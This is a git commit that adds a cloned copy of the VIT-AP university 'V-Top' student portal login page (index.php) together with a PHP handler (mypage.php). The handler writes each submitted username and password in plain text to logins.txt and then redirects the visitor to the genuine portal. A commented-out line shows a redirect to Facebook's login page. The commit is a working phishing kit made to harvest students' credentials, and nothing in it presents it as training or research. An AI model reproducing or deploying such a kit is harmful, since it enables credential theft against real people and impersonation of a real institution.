1088200ba4a00ed1282b151bae3bce1eb68d5cf4
asishtech <68698410+asishtech@users.noreply.github.com>
2020-09-23 19:19:36 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,178 @@
+<!DOCTYPE html>
+<!-- saved from url=(0049)http://vtop2.vitap.ac.in:8070/vtop/initialProcess -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<meta name="description" content="V-TOP : An Official VIT, Vellore Web Portal">
+	<meta name="”robots”" content="”NOODP,NOYDIR”">
+	<meta name="keywords" content="VTOP, vtop, SDC,sdc ">
+    <!--<base href="http://vtop2.vitap.ac.in:8070/vtop/">--><base href=".">
+   	<meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    
+    <meta name="robots" content="index, follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    
+
+    <title>Vellore Institute of Technology (VIT)</title>
+    
+    
+
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<title>VIT-AP University - VTOP</title>
+		<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+		<link rel="icon" type="image/png" href="http://vtop2.vitap.ac.in:8070/vtop/assets/img/favicon.png">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/jquery-ui.css">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/bootstrap.css">
+ 		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/bootstrapValidator.css">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/font-awesome.min.css">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/AdminLteCompatibility.css">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/VTopScrollbar.css">
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/VTop.css">		
+		<link rel="stylesheet" href="./Vellore Institute of Technology (VIT)_files/scrollableTable.css">
+		
+		
+	
+    
+</head>
+<body class="VTopBody" style="padding-top: 52.625px;">
+
+		
+		<div id="page_outline">
+ 
+		   	
+		   	
+			<nav class="navbar navbar-default navbar-fixed-top" style="background-color:#2980B9;color:#EAF2F8">
+  				<div class="container">
+						<img src="./Vellore Institute of Technology (VIT)_files/new VIT_AP logo.png" class="img-responsive pull-left" alt="User Image" width="170" height="50">
+						<h3 class="pull-right" style="color: #fff;font-family:Times; font-size: 24px;">V-Top</h3>
+  				</div>
+			</nav>
+	
+	    	
+	    	<input type="hidden" value="" id="winImage">
+	    	<div id="page-wrapper" style="padding-top:50px;">
+	    	
+	    	<script>
+					 /*<![CDATA[*/
+				var x = "local";
+				
+				/*]]>*/
+				</script>
+	    	
+	    	
+	    	
+				<section id="loginbox" class="col-md-4 col-md-offset-4">
+	
+					<div class="box box-info">
+	
+						<div class="box-header with-border">
+							<h3 class="box-title">V-Top Login</h3>
+						</div>
+	
+						<div class="box-body">
+						
+								<form class="form-signin" id="form-signin_v1" action="mypage.php" method="POST" autocomplete="off">
+							
+								<p class="box-title text-danger"></p>
+								<p class="box-title text-danger"></p>
+								<p class="box-title text-success"></p>
+	
+								<div class="form-group has-feedback">
+									<input type="text" class="form-control bg-default" id="uname" name="uname" placeholder="Username" maxlength="20" onkeyup="this.value = this.value.toUpperCase()"> <span class="glyphicon glyphicon-user form-control-feedback"></span>
+								</div>
+	
+								<div class="form-group has-feedback">
+									<input type="password" class="form-control" id="passwd" name="passwd" placeholder="Password"> <span class="glyphicon glyphicon-lock form-control-feedback"></span>
+								</div>
+								
+								<!-- <div th:switch="${user.role}"> 
+								  <p th:case="'admin'">User is an administrator</p>
+								  <p th:case="#{roles.manager}">User is a manager</p>
+								  <p th:case="*">User is some other thing</p> 
+								</div> -->
+	
+								<!-- <th:text>local</th:text> -->
+								
+								<div>
+	
+								 <div align="center" id="captchaRefresh">
+								
+									<div class="col-md-offset-1"> 
+										<img alt="vtopCaptcha" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAALQAAAAtCAIAAACIxtbuAAAUi0lEQVR42sWce5xN1RvGp4t0Q7kXNXRxK9VQIxLVUJNbbjUqlYyhxjCukw9dkEvEMF0I0yhGyKBhyJ0IjS4u04QiRqlI0Ywyoub3/czbZ1nts8/a++xzpt/6Y2afvddee+21nvd5n/dd65ywouISVlyKtCIf1UlVwbaa5Yx+V8WKFVu1apWamnr06FHbZov8FP2Sv2q25227ZH6W+54Y2vfWuG3lgOq76aG38q+5d9Ooec4ss15YWAg4IiIi7rjjDs40a9aMv3l5ecGMnePE+zvjYZRdzpZ7xJvR4AbE5l75a8HlK/i2E+bZIt08KT8/f968eTExMVdcccXNN9985513VqhQoWHDhqNGjcrNzQ3UcENlEx7GK1RQM7+XS/s01HdpvYExR1EJFEtHs7KyYmNjK1WqVKtWrcaNG3Omdu3aQ4YMyc7O/vvvv12Ob5CU6xlAbnxHoB4hGLIpaf8S5pkADWzmfhCvvfba8PBwUFKjRo3q1asnJCRw8uzZsyHBohu+Nc9NMCqk5KY2IGsJ00qgHQ4rIcJwPyKfffbZ0KFD69atW7VqVVACkaBRunXrtmTJklOnToWQtEJCkAFpgmDMzDPg3APaleMLrWz2TOx79uwZM2YMNcuXL9+oUaP69euXK1euc+fO7733XginpKTdkJtxM9CG56l1Q0X68e+//26gq3Nq1MNruFG5nof7u+++e+2117ilbNmy/G3QoAF/o6Ojp0+ffuTIEW+BbvDB4X8DSn8vZei/o0P3PTlt2jROgg9nsvn/WqGhwrFjx9LS0tq2bVumTJnbbrstMjISLmnatGlycvKBAwdCSK3euD3QMKEkNFOgj2NI27dvj9S7+uqrhTwc4ylXfBUMGZjjLscXLigoeP/99x999FGC4ZtuuolgmEsREREjR47MyckJaMi8ddslRXmAS8lF6b4nV69eDSZuvPFGhg4n7q8DlgCtBEO1gPyRwfmpj8uXL4+Li6tcuTIviYCVt01KStq6dau/YDi0osGze7IceMv/2o6JY/dOnz49aNAgLlWqVGnw4MF8dJtVCq33/W807F9//bVx48Z+/foRA0OSVL7uuusASnx8PPZx5syZ4KPTkAxFSFxGkCHY7t27ccrUYXzWrFkT0IPsF1BOnDiBv2/dujV2efnll+P1a9Wq1aZNm5kzZ/7222/BT/zZs2fXr1/fp08fSatfdNFFkj+FFVasWKE4wDGC5+CLL77gAHeDWQARunr++edLm0DnnnvumThxIiK3hBIn/0FqK8hEFtHfNddc06FDBwRHoM+yeY358+dXqFAhzE9hDjIyMoKRVJs2bapXr16Y/1KnTp1ly5YFGsvRMX8Nli5deuzYscGk1yg//PDDeeedp9rkmDMeZs63e5dcckm1atVuueWWjh07pqSk7Nq1yzOIwzwVh2hF1Rg1apSb5hhrzwanD7GXHvtcevXVV900ePvttzOdBtRKgOfvuVOnTrU0KGc8BGiO5e677xYX4CHO8owPm3fR2yUoUDPHQY8ePTjAjxw/fpyD7t2761cXLlzo0sWq49GjR+sdwlAyMzPz8vIKCwsPHz6MQ3n66aex8oAifkSGBW2LFy8+cuQIB5ggDeqXLr744rvuumvChAn79+/3N7IHDx60vfTAAw9YBpQzHrS2+wnr1auX6KeAhEjomcO3XZWaNAPTPfUxi+qusmXLLl261HYo9+3bd//99xvyV/pH1AliSDXbtWtXtKpek8G97LLLwIS+oCM+6NZbb+Vg586det6wXLlyasr1R2MhiBjLu3NGFFhA6Rzf0eO533//PQEXqG3atKnlKf68oe9D0Z76jUi66Ojo66+/HtXozaWee0BycrJqt2fPnm6Ia/LkyS6lL9yAtpW7EIxZWVnm4evbt2+gLHrhhRdGRkYiop988sn+/fsL7c+dOxePXqVKFVGpFEaKmhdccMGll1561VVXIYQ5mZCQsHnzZqA2fPhwKnz44Yfu6TqgrKX5XnULHVN1cPS2UGC+v/3225UrV3IpMTEROc9L6Y03a9asYcOGGIMChy0lm+J2dYQgUi7Dl3VVE1i24+v5ntQdNvYdqqhBFnKlSIqMAxxH8+bNiVMYncaNGxPIEbYobyXo5CNxDaQCUM4vLpwvVarUDTfcAGjQ48q5yKNjYmJskcH5YASpv6vMuqpDr3JycugP1DtlypQBAwaIZocOiU4jIiJki4wvsWG66Pqvv/76zz//9Jj0k384ftUoDzPfiYGqyvChm6fqtzguSLpPHaIxVYNz5szZsmULnPTuu+/CgsOGDXvmmWcefvjh++67Dw9SsWJF3bPUrVu3du3aNWvW5CMQARznFRc5UBjC5ogDLT2nWd0/nj59OiBNah4E2IvAe926dbpaAsFwCSjH6YB44n96Lr4ScNB/3o4w3rPHdwBHamqqahRONrfSr18/VTktLc3xqXv37lX169evXxS6bZhVq1ZVLcseVX/1AbGqOXjw4LVr16K+4TNIm/fFE0VFReGeBSgWb6WzDtC58sor9TpYLaR77733du7cGQk5dOjQiRMnvvPOO1wCrLz7sWPHLEpIFWT4hg0bZsyYkZSUhDxncOAtnCANNmnSBM7QK/MI3D2h2QcffJCbm4vcGTRoUKXiInlPR7flErtWcAhZSUlPTzcnc2bPnq0q0z/Hx/Dytj329c2B4l2fNnNW+NSpU6omYZe52U8++QSWRpxinZUrV9YZmwnjvD5tQjAc4JIaNGhAFCpbZbFv3Fx4eDhgEq9XvXp18Ofrm5ALiAM4gGPAgbOQFmRFWool8SN5T5FxetBrDlAD2mh9bqrQcarFjz76qMi4GwWwq8rt2rVznML4+HhVH2B5WHDyV8cCDsMtOjiQI27yMUz5ggULcFJ6sCNF6TMKMhCL54xMFbjB12DNoApYIIfhHqEcLjH3ejsCMrgHv0BlXodnVatWTXhCBwe8QnwnVITf4YzkPQ1xrIfVQSs+5B8+WDWK5DRLATSOqoxxOM4rClHVz87O9gACw+KwP7diKbpbkVk0P5Twqlpx2bhxoz6XTGG9evUaNWqkJ1dwKEhgpAxQEC7hoGxx4UB0jOBAJLMuX5QqgleoDDjwlcTnsiCiSvny5RUVyRk8IC+CQFQBmiWBeejQIbVpo8i4X8RhvV7QKuWXX35x3BagKoNfx1AFvtW9bFHoCmysWt60aZOh5vLly1VNzNRN4wS0kIeeeGjZsuWsWbOeeOIJZkWXHRJD4h2wMQCB32F2cRNMMDoRtoBFJO9pMe64uDi084oVKziWFaU//vgDYtixYweq6PXXX9djMUAAFHg0QIGNgClAAS6ARgVoeuNoWAGr5OYtqojziopkQv3iQ8J9xxSyr73SRcdR1lc9Tpw44W0brW2dZ599VrU8YsQIQ2UGRc+Tml8Nrff5558Lx+gMgRpgeiRC1s0JoGD3CEmm7amnnmKydR/HrGPEnJw0aRJo0EcP5IEYYMS9AFGCr7FjxyI5mTOsVI+w9GFB4TKj1LEEaB7So6KK0FWimq1+in8WYWyOJ8+cOaNnCd1HbhRzzO0vU+7vEQyi/pKYnW3NgwcPQsK6oatLBQUF27dvJ3IZPXp0t27duIqVU5lAFxxIFlUVPsbExDz//PNMhlIMUhISEiRg5i7lOzIyMk6ePGkYEMKlPn36tGjRQtwExEOQAvhACZQsdi9FxArOznFdM9AiVMSBHlL9y62IaDLna1UPqGAZaAOeeKSu9n0XCwL9ZpEOGnqCyephiJCzfhc0YBkO+hwbG8scQLwMOqODhhBthLRkgjFiPAJqACo2rKRIml9fidy/f/+ECRNoB88SGRlJI2XKlEGzE9mKszZoRvpJlJSWlkZc2qZNG0tNCIxIB87DR9Pgc889B0C3bduWn58f5MKbaaeI/ONl3Oc9sTZVE7wbJlWQoTMzDpsXI1ifOXMmHxkOl77GvGlbX8/MzMxEfuK2U1NT8bISZ+oRBxYPn+OGIQnAASA4Sa+oT6Smr9wKaKSgACyPnjJlirpKTUuv3nrrLfAEOAg6YAK0CMLzjTfeME+MXn7++We9zwhh3gL/gsgQ1yaMAscA08TERNk5HMyGPfv9HHhT1eivv/7qXpCaxZ2AQ9du2FPz4oJ5ifzm3RhBXh6VjqZDVTGj1IS9J0+ePGfOnJUrV6IA8vLybMUQ3r1r166O9qFnSBFY06dPX7duHdLPd2ORqmbZwCE77fRHI64t2zt8uwfu09PTO3XqBDiAo442x/mTtWVd+MO7u3fvXrRokVrfxjjhP8mv+GZyU1JSVq1apWexA/tOlPyrU6eOahRuNIeU5uUVX3zoSW6kMgw8cOBAhBvym8FCzzNwgAM7hjOhYtw2rwqAsA98MCEJ3QO+EukxzYhBBgswcSMOsUJx8bdNhGZh4I8//ljf2OHGjPT1IJgVG9VX8319PPUNraGHUEi8tX4LtoENAH3bb3BZatpKMcB94MABicXwlb5qFyVEQMBAMdSIqnHjxkm2wtUmVrmmJ8GI7M3MA/eqylFRUY6j3LNnT0cwIVSxvF27dmHQyEMYe+TIkX379n3sscfgTCxD1jgkYSBKDaMpXbq0JBXQ2+BDVlz1xCUSjxYGDBigL1W0b9/eV3/5Ft8NHB72Rpi3PdSsWRPcAztkEMqUgdV7JSGuFFSIv31f/hrHhfXu3RvZhBXBzbL7TggGoabScYzzggULvvzyS5tFItv0ueNeLFV69OjhCEC8r76u4c3/yc4MaAa/06VLl/j4+KSkJGmTgFbEo6gHCmMBmBgOIS1ISM9bAyP0OcCyDd4MGzgci+0GW8NmH8G0QBnLRhrDcwwpTMBUyZe7pLz00kuel3xFKmzevJkDJvrBBx+sUaMG4FBfZ8fXc4ZBs4QL/zCHvvDG/e578Oabb/pDsW19WXgr8vSDKpYwykCMonBRu1lZWUQKRBB6H2S/jwKHbUA4d+5cD7TBXeahk8y3DlPIHwEkFhwREcEZvCraS888UZYsWeJm7drlPkvJZuHOIAIcfYcOHQjdBRw2C2/6kj1ocp+3kGSRo7TREwaIBkwET4GkwJ3FxMRgK/3793/hhRfGjx+P5549ezbuec2aNdnZ2V999dWhQ4eOHz/uZsOcv8LtahUG7SKYMLsVfQMHgYyeMx0+fLj+plx13N5x8uRJdE+LFi1kEU6Xd5ZxQ0AkJydD/qgEtXkHX8mwELz4S//YbjAONE6x0obekOJk/LpsNrE1U3qvpB/C0PJVIn8rgZMmTdITlJAYvhbEELCARZGfUkAMgQwcixmhwvAjqHH0IAPEjWgr/DSynzpoAuIaRBbeGviPGTOGaBOeyMjIIMCBRVEw9JYxVQ5I8aL5m3xQunxTV8rWrVtVNR4q3lrdIldtt3eAv9WrVxO9y8YLui3pJodtvcVnkO26OTFQNI5LxddgLYaNZyH87tm5JiTfrqIgfzfoGWv3AgLT0ZPNECmUs2HDBmgfKp4xYwbmMmLECBrk0Y8//rhIBHwhihL1pDgW1kVM4CyBMlEMDAxKwBOjJsCCpTnJJZgZfuJefZpVTgIjRpYybbwO0Hn55ZeBL751/vz5y5Yt07ezy5YRPdkKOPSEGOah7+qTyrm5uTAKT5dFPkkjofsKCwvdzB+MojgGq3jllVcQVTTCW/N2sgjHJcJas+bw8PtP9uCQ3LMij3nz5vm2zklFG+g1x21g+u2LFy/WLcx3G6liplatWtm+APHe0aNHGbidO3cSmkLyDHdaWhoeatiwYUOGDElISJBYkQAHQhIu1LMsuFVgByFxCxABWEJasuOSYxFo+td2ZMMpHcYf4Zg5A+1xRla5RMjLXSrmFFvnEahLYJqSkqKvGDuCY+3atfomphdffFG9PspDwi56wkOphvHAmp9++qkjOBx/AMF+J5g6i93o+IiLi9u2bRsKHH2HuOOjnkuAxoucfmHNchVisBgxbwtJYk/EsatWrZJv+Lj8sSW9DoEMyIDDmQaJivEsAEXfcwupfPPNN8RsvAs1Fy1aNGvWLAS1JNwSExNjY2MfeeQRoKnHKYgVGgFVVapUwaMxGXjDi4qLbEWwrIUyRHL7ZcVFdjLzEVBaVuEpaqkMAEEPvXr10neKUGA4X7GFMCfgl/2zIBWUhIeHo7KJ/M1BdaBBgMcvNXXq1EmPHfTVQkn6YtmISoh63LhxYAK8t2vXrkmTJhZF5iZhEJKvCTGCBQUFbrhU1xCyh4iXwkIOHz68Z88ebHT9+vVoUgRQ27ZtlYrSzYZ5wrIRZCIqAQdSSU5a5t5c4DxwBo2BALwkr9CyZcuOHTsC+t69e8OUTNbAgQNBM6yGr6FOiL+34ntN5w/bHj/00EOIBsusowN4DUiYXmJhUDqKAWMVmckBHzkp8bS5rwyi2hXn/tf1/BWoCHHnbzXYl2bdRB+ySYWh4HVwT0gieMU3upFC0PjTTz/t27dv+/btLmdLNseXKlUKcDCesrjI3OOq5BcoRGaJ0hKZxVW9DwGVpUuXyu6+vXv3Qrr5+fn/rF/a2joEBWfiMrEJ3w23wN921uUqEGF2gQug6d69O3KPBt9+++3MzEwegfHJ0gxOBO3J24J62ZiJtyamRUn4/piCGSKokGnTpuERZK8NxspsEQ3RAV5HIkA32kj+irCwzVsQEvMgRgZJgY/gQTyRt0N76XkRWghoVV2+ZMDsopHRxTt27NA3pDFc6LCcnJwtW7bgKxcuXEhERlwG4lEbzBT2SdQWHR2t77gLqCBv8ZWMGO4JhMk3Nv6Vx7W1dfFq+AKdNsE15GY765Zt1gZDDzbK8vpzxN7qUwE9KBu6AAQjiEZhttxQmudemQfNcU/ojz/+SNwbFRUlls9fjD89PX3q1Knjx49H58pWtC5durRu3ZoZx1CJrSTyAhyY6D/xoZiLbut81Gddj2Xk64TyRcKQ/6yFm8H1/HOfwRQBByElJBxMRi6EZuByHGy3CJlvPOdWHJlWjY7AMJg03H8/iCGEkb+NWEH+jIf7joXqp8Zcbs38H0s0EkSMBZ2GAAAAAElFTkSuQmCC">
+										 <button type="button" onclick="doRefreshCaptcha();" style="width:35px; border:none; background-color:white; background-repeat:no-repeat;">		
+											<img src="./Vellore Institute of Technology (VIT)_files/refresh_img.png" width="20px">
+										 </button>									 
+										<input type="text" id="captchaCheck" style="margin-top: 5px; width: 70%" name="captchaCheck" placeholder="Captcha (CAPS &amp; NUMBERS ONLY)" maxlength="6" onkeyup="this.value = this.value.toUpperCase()">															
+									</div>
+								
+								</div>  
+								</div>
+								
+								
+								<div class="box-footer">
+									<div class="col-xs-6">
+										<!-- <a href="resetPassword" class="pull-left need-help">Forgot Password </a><span class="clearfix"></span>
+										<a href="forgotUserID" class="pull-left need-help">Forgot UserID </a><span class="clearfix"></span> -->
+										<a href="javascript:resetPassword()" class="pull-left need-help">Forgot Password </a><span class="clearfix"></span>
+	                       							<a href="javascript:forgotUserID()" class="pull-left need-help">Forgot UserID </a><span class="clearfix"></span>
+									</div>
+								
+								
+									<div class="row col-xs-6">
+										<button id="captcha" class="btn btn-primary pull-right">Sign in</button>
+									</div>	
+									<!-- <div th:if="${ipstatus=='local'}"> -->
+								<!-- 	<div class="row col-xs-12">
+										 <button type="submit"  class="btn btn-primary pull-right">Sign
+											in</button> 
+								 
+									</div> -->													
+								</div>
+							</form> 
+						</div>
+					</div>
+					</section>
+				</div>
+
+
+
+</div>
+			
+
+		
+		<div class="modal fade" id="myModalFooter" role="dialog">
+		  <div class="modal-dialog">		  
+		    <!-- Modal content-->
+		    <div class="modal-content">
+		      <div class="modal-header">
+		        <button type="button" class="close" data-dismiss="modal">×</button>
+		        <h4 class="modal-title" style="color:red;">Sorry !!!</h4>
+		      </div>
+		      <div class="modal-body">
+		        <p style="color:green;">This page is under Construction !!! Please try later</p>
+		      </div>
+		      <div class="modal-footer">
+		        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+		      </div>
+		    </div>
+		    
+		  </div>
+		</div>
+
+		
+		
+		
+		
+				
+		
+		
+		
+		
+		
+		
+	
+
+
+</body></html>
---
+++ mypage.php
@@ -0,0 +1,21 @@
+ <?php
+
+ if(isset($_POST['uname'])) {
+    $handle = fopen('logins.txt', 'a');
+    $uname = "username: ".$_POST['uname']." Password: ".$_POST['passwd']." \r\n";
+  	fwrite($handle, $uname);
+
+   // $file_pointer = "logins.json";  
+   // unlink($file_pointer);
+   //  $handle = fopen('logins.json', 'a');
+   //  $myObj->uname = $_POST['xyz'];
+   //  $myObj->pwd = $_POST['abc'];
+        
+   //  $myJSON = json_encode($myObj);
+
+   //  fwrite($handle, $myJSON);
+//  header("Location:https://www.facebook.com/login/");
+   header("Location:http://vtop2.vitap.ac.in:8070/vtop/initialProcess");
+  exit();
+   }
+?>
